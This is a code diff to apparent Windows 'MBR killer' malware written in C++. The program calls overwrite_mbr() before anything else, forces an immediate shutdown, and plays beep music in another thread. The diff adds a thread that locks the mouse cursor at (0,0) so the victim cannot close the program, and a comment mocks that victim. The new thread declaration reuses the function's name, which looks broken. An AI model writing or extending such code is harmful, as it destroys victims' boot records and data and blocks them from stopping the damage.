@@ -2,6 +2,7 @@
 #include <vector>
 #include <iostream>
 #include <Windows.h>
+#include <winuser.h>
 
 void overwrite_mbr(void)
 {
@@ -120,16 +121,24 @@ void console_anim_thread(void) {
     system("C:\\Windows\\System32\\shutdown /s /t 0");
 }
 
+void mouse_lock_thread(void) {
+	while (true) {
+		SetCursorPos(0, 0);
+	}
+}
+
 int main(void)
 {
-    // Overwrite before get fun (skid can close program before...)
+    // Overwrite before get fun (skid can close program before... (ho no ! the kid can't cuz the mouse was locked LMFAO))
     overwrite_mbr();
 
     std::thread music_thread(beep_music_thread);
     std::thread console_thread(console_anim_thread);
+	std::thread mouse_lock_thread(mouse_lock_thread);
 
     music_thread.join();
     console_thread.join();
+	mouse_lock_thread.join();
 
     return EXIT_SUCCESS;
 }
